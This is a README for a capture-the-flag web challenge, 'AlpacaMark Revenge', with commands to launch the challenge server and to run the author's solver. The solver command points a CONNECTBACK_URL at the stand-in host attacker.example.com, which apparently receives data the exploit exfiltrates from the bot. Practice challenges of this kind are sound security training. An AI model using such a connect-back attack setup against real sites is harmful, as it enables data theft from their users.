# [web] AlpacaMark Revenge

## Description

`:alpaca:` -> 🦙

Note: This is a fixed challenge of [AlpacaMark](https://alpacahack.com/ctfs/round-11/challenges/alpaca-mark) in Round 11.

## Attachments

- [alpaca-mark-revenge](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.
